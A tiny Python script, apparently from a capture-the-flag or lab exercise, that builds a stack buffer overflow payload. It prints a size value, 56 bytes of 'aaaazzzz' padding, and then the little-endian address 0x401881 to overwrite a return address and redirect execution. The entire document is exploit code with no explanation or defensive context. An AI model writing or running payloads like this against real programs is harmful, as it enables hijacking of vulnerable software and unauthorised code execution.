import random

size = 64

print(size, end='')

while size > 8:
    print('aaaazzzz', end='')
    size -= 8
#00 00 00 00 00 40 18 81
print('\x81\x18\x40\x00\x00\x00\x00\x00', end='')